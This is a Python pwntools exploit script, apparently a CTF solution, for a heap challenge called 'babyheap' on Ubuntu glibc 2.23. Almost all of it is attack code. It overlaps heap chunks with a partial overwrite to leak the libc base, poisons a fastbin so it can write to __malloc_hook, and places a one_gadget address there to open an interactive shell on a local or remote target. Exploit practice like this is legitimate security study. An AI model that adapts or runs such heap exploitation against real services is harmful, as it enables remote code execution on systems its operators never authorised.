#!/usr/bin/env python3
# libc version: Ubuntu GLIBC 2.23-0ubuntu11

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./babyheap"
locallibc = "/lib/x86_64-linux-gnu/libc.so.6"

def allocate(size):
    io.sendlineafter("Command: ", str(1))
    io.sendlineafter("Size: ", str(size))

def fill(idx, content):
    io.sendlineafter("Command: ", str(2))
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(len(content)))
    io.sendlineafter("Content: ", content)

def free(idx):
    io.sendlineafter("Command: ", str(3))
    io.sendlineafter("Index: ", str(idx))

def dump(idx):
    io.sendlineafter("Command: ", str(4))
    io.sendlineafter("Index: ", str(idx))
    io.recvuntil("Content: \n")
    return io.recvline()


def exp():
    allocate(0x20)
    allocate(0x20)
    allocate(0x20)
    allocate(0x20)
    allocate(0x80)              # smallbin

    free(1)
    free(2)

    payload = p64(0) * 5
    payload += p64(0x31) + p64(0) * 5
    payload += p64(0x31) + p8(0xc0)             # partial overwrite to point to small bin
    fill(0, payload)

    payload = p64(0)*5 + p64(0x31)
    fill(3, payload)            # change smallbin's size

    allocate(0x20)
    allocate(0x20)              # get "smallbin" index 2

    payload = p64(0)*5 + p64(0x91)
    fill(3, payload)            # change smallbin's size

    allocate(0x80)              # avoid merge with top index 5
    free(4)

    libc_base = u64(dump(2)[:8]) - 0x3C4B78     # chunk fd - offset
    log.debug("libc_base: 0x%x" % libc_base)

    allocate(0x68)              # index 4
    free(4)
    payload = p64(0)*5 + p64(0x71) + p64(libc_base + libc.sym["__malloc_hook"] - 0x20 - 3)
    fill(3, payload)
    # 
    allocate(0x68)              # index 4
    allocate(0x68)              # index 6
    
    # one_gadget 0x4526a
    payload = b"\x00"*3 + p64(0xdeadbeef)*2 + p64(libc_base + 0x4526a)
    fill(6, payload)
    # gdb.attach(io, "b *$rebase(0x116C)")
    allocate(0x20)

    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)
libc = ELF(locallibc)
exp()
